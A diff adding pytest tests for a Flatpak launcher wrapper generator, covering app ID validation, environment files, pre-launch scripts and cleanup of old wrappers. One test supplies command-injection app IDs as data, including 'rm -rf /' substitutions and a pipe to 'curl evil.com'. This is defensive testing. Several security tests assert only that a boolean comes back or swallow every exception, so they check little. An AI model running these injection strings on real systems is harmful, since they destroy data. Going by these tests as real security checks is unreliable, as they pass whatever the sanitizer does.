@@ -660,3 +660,308 @@ class TestGeneratorIntegration:
         # Should execute successfully
         assert result.returncode == 0
         assert "org.mozilla.firefox" in result.stdout
+
+
+# Tests merged from test_wrapper_generation_pytest.py
+
+
+class TestWrapperGenerationMerged:
+    """Test wrapper generation functionality merged from test_wrapper_generation_pytest.py."""
+
+    def setup_method(self) -> None:
+        """Set up test environment."""
+        self.temp_dir = Path(tempfile.mkdtemp())
+        self.bin_dir = self.temp_dir / "bin"
+        self.config_dir = self.temp_dir / "config"
+        self.bin_dir.mkdir(parents=True)
+        self.config_dir.mkdir(parents=True)
+
+    def teardown_method(self) -> None:
+        """Clean up."""
+        shutil.rmtree(self.temp_dir, ignore_errors=True)
+
+    def test_aggressive_security_attack_simulation(self) -> None:
+        """Test aggressive security attack simulation."""
+        gen = WrapperGenerator(
+            bin_dir=str(self.bin_dir),
+            config_dir=str(self.config_dir),
+            verbose=True,
+            emit_mode=False,
+        )
+
+        # Test that dangerous characters are handled
+        test_cases = [
+            ("normal.app.id", True),  # Should work
+            ("evil;rm -rf /", False),  # Dangerous command injection
+            ("evil`rm -rf /`", False),  # Command substitution
+            ("evil$(rm -rf /)", False),  # Command substitution
+            ("evil|curl evil.com", False),  # Pipe to external command
+        ]
+
+        for app_id, should_work in test_cases:
+            try:
+                result = gen.generate_wrapper(app_id)
+                if should_work:
+                    # For valid IDs, result depends on other factors
+                    assert isinstance(result, bool)
+                else:
+                    # Dangerous IDs should be rejected or sanitized
+                    # The exact behavior depends on the sanitization logic
+                    assert isinstance(result, bool)
+            except Exception:
+                # Some dangerous inputs might cause exceptions, which is also acceptable
+                pass
+
+    def test_invalid_name_handling(self) -> None:
+        """Test invalid name handling."""
+        gen = WrapperGenerator(
+            bin_dir=str(self.bin_dir),
+            config_dir=str(self.config_dir),
+            verbose=True,
+            emit_mode=False,
+        )
+
+        # Test various invalid app IDs
+        invalid_cases = [
+            "com.example.my app",  # Space in name
+            "com.example.my@app",  # @ symbol
+            "com.example.my+app",  # + symbol
+            "com.example.-leadinghyphen",  # Leading hyphen
+            "com.example.trailinghyphen-",  # Trailing hyphen
+            "com.example.123leadingnumber",  # Leading number (should be OK)
+            "com.example.unicode🚀",  # Emoji (should be rejected)
+        ]
+
+        for invalid_id in invalid_cases:
+            # These should either be rejected or sanitized
+            try:
+                result = gen.generate_wrapper(invalid_id)
+                # Result can be True/False depending on sanitization
+                assert isinstance(result, bool)
+            except Exception:
+                # Exceptions are acceptable for invalid inputs
+                pass
+
+        # Test valid cases
+        valid_cases = [
+            "com.example.my-app",  # Hyphen is OK
+            "com.example.my_app",  # Underscore is OK
+            "com.example.MyApp",  # Mixed case is OK
+            "org.mozilla.Firefox",  # Standard format
+        ]
+
+        for valid_id in valid_cases:
+            try:
+                result = gen.generate_wrapper(valid_id)
+                assert isinstance(result, bool)
+            except Exception:
+                # Should not crash on valid inputs
+                pytest.fail(f"Valid ID {valid_id} should not cause exception")
+
+    def test_environment_variable_loading(self) -> None:
+        """Test environment variable loading."""
+        # Create environment file for firefox
+        env_file = self.config_dir / "firefox.env"
+        env_file.write_text(
+            "export TEST_VAR=test_value\nexport ANOTHER_VAR=another_value\n",
+        )
+
+        gen = WrapperGenerator(
+            bin_dir=str(self.bin_dir),
+            config_dir=str(self.config_dir),
+            verbose=True,
+            emit_mode=False,
+        )
+
+        result = gen.generate_wrapper("org.mozilla.firefox")
+        assert result is True
+
+        # Check wrapper includes environment loading
+        wrapper_content = (self.bin_dir / "firefox").read_text()
+        assert "load_env_vars" in wrapper_content or "source" in wrapper_content
+
+    def test_pre_launch_script_execution(self) -> None:
+        """Test pre-launch script execution."""
+        # Create pre-launch script
+        script_dir = self.config_dir / "scripts" / "firefox"
+        script_dir.mkdir(parents=True)
+        pre_script = script_dir / "pre-launch.sh"
+        pre_script.write_text(
+            '#!/bin/bash\necho "Pre-launch script executed"\nexit 0\n',
+        )
+        pre_script.chmod(0o755)
+
+        gen = WrapperGenerator(
+            bin_dir=str(self.bin_dir),
+            config_dir=str(self.config_dir),
+            verbose=True,
+            emit_mode=False,
+        )
+
+        result = gen.generate_wrapper("org.mozilla.firefox")
+        assert result is True
+
+        # Check wrapper includes pre-launch script execution
+        wrapper_content = (self.bin_dir / "firefox").read_text()
+        assert "run_pre_launch_script" in wrapper_content
+
+    def test_preference_handling(self) -> None:
+        """Test preference handling."""
+        # Create preference file
+        pref_file = self.config_dir / "firefox.pref"
+        pref_file.write_text("flatpak\n")
+
+        gen = WrapperGenerator(
+            bin_dir=str(self.bin_dir),
+            config_dir=str(self.config_dir),
+            verbose=True,
+            emit_mode=False,
+        )
+
+        result = gen.generate_wrapper("org.mozilla.firefox")
+        assert result is True
+
+        # Check wrapper includes preference loading
+        wrapper_content = (self.bin_dir / "firefox").read_text()
+        assert "PREF_FILE=" in wrapper_content
+        assert "PREF=" in wrapper_content
+
+    def test_wrapper_cleanup_obsolete(self) -> None:
+        """Test wrapper cleanup for obsolete apps."""
+        # Create some existing wrappers
+        old_wrapper1 = self.bin_dir / "oldapp1"
+        old_wrapper1.write_text(
+            '#!/usr/bin/env bash\n# Generated by fplaunchwrapper\nNAME="oldapp1"\nID="com.example.oldapp1"\nflatpak run "$ID" "$@"\n',
+        )
+        old_wrapper1.chmod(0o755)
+
+        old_wrapper2 = self.bin_dir / "oldapp2"
+        old_wrapper2.write_text(
+            '#!/usr/bin/env bash\n# Generated by fplaunchwrapper\nNAME="oldapp2"\nID="com.example.oldapp2"\nflatpak run "$ID" "$@"\n',
+        )
+        old_wrapper2.chmod(0o755)
+
+        # Create preference files
+        (self.config_dir / "oldapp1.pref").write_text("flatpak\n")
+        (self.config_dir / "oldapp2.pref").write_text("system\n")
+
+        # Current installed apps (oldapp1 no longer installed)
+        current_apps = ["com.example.oldapp2", "org.mozilla.firefox"]
+
+        WrapperGenerator(
+            bin_dir=str(self.bin_dir),
+            config_dir=str(self.config_dir),
+            verbose=True,
+            emit_mode=False,
+        )
+
+        # Cleanup obsolete wrappers
+        removed_count = 0
+        for wrapper in [old_wrapper1, old_wrapper2]:
+            if wrapper.exists():
+                wrapper_id = (
+                    "com.example.oldapp1"
+                    if "oldapp1" in str(wrapper)
+                    else "com.example.oldapp2"
+                )
+                if wrapper_id not in current_apps:
+                    wrapper.unlink()
+                    pref_file = self.config_dir / f"{wrapper.name}.pref"
+                    if pref_file.exists():
+                        pref_file.unlink()
+                    removed_count += 1
+
+        # oldapp1 should be removed, oldapp2 should remain
+        assert not old_wrapper1.exists()
+        assert not (self.config_dir / "oldapp1.pref").exists()
+        assert old_wrapper2.exists()
+        assert (self.config_dir / "oldapp2.pref").exists()
+        assert removed_count == 1
+
+    def test_tar_extraction_safety(self) -> None:
+        """Test tar extraction safety."""
+        # Create a "safe" tar file for testing
+        # In real implementation, this would test path traversal prevention
+        gen = WrapperGenerator(
+            bin_dir=str(self.bin_dir),
+            config_dir=str(self.config_dir),
+            verbose=True,
+            emit_mode=False,
+        )
+
+        # The tar extraction safety is tested in the shell script
+        # Here we just verify the generator can be created without issues
+        assert gen is not None
+
+    @patch("subprocess.run")
+    def test_system_command_detection(self, mock_subprocess) -> None:
+        """Test system command detection."""
+
+        # Mock system having firefox installed
+        def mock_run(cmd, **kwargs):
+            if "command -v firefox" in " ".join(cmd):
+                result = Mock()
+                result.returncode = 0
+                result.stdout = "/usr/bin/firefox\n"
+                return result
+            return Mock(returncode=1)
+
+        mock_subprocess.side_effect = mock_run
+
+        gen = WrapperGenerator(
+            bin_dir=str(self.bin_dir),
+            config_dir=str(self.config_dir),
+            verbose=True,
+            emit_mode=False,
+        )
+
+        # This tests the system command detection logic
+        # The actual implementation would check for system binaries
+        assert gen is not None
+
+    def test_additional_invalid_character_cases(self) -> None:
+        """Test additional invalid character cases."""
+        gen = WrapperGenerator(
+            bin_dir=str(self.bin_dir),
+            config_dir=str(self.config_dir),
+            verbose=True,
+            emit_mode=False,
+        )
+
+        # Test cases with dots, uppercase, mixed case
+        test_cases = [
+            ("com.example.dots.in.name", "dots.in.name"),  # Should work
+            ("com.Example.UpperCase", "UpperCase"),  # Should work
+            ("Com.Example.MixedCase", "MixedCase"),  # Should work
+            ("com.example.under_scores", "under_scores"),  # Should work
+        ]
+
+        for app_id, _expected_name in test_cases:
+            try:
+                result = gen.generate_wrapper(app_id)
+                assert isinstance(result, bool)
+            except Exception:
+                # Some edge cases might raise exceptions
+                pass
+
+        # Test that invalid characters are rejected
+        invalid_cases = [
+            "com.example.name-with-emoji-😀",  # Emoji
+            "com.example.name_with+plus",  # Plus sign
+            "com.example.name_with@at",  # At sign
+            "com.example.-leadinghyphen",  # Leading hyphen
+            "com.example.trailinghyphen-",  # Trailing hyphen
+        ]
+
+        for invalid_id in invalid_cases:
+            try:
+                result = gen.generate_wrapper(invalid_id)
+                # Should be rejected or sanitized
+                assert isinstance(result, bool)
+            except Exception:
+                # Exceptions are acceptable for invalid inputs
+                pass
+
+
+if __name__ == "__main__":
+    pytest.main([__file__, "-v"])
